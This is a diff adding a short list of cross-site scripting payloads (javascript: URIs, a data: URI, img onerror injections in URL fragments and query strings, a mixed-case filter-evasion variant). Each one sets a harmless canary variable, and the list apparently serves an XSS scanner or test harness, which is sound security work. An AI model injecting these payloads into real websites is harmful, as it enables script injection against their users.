@@ -1,0 +1,8 @@
+javascript:window._xss_confirmed='CANARY'
+data:text/html,<script>window._xss_confirmed='CANARY'</script>
+javascript:void(window._xss_confirmed='CANARY')
+#<img src=x onerror=window._xss_confirmed='CANARY'>
+#"><img src=x onerror=window._xss_confirmed='CANARY'>
+#javascript:window._xss_confirmed='CANARY'
+?default=<script>window._xss_confirmed='CANARY'</script>
+jaVasCript:window._xss_confirmed='CANARY'
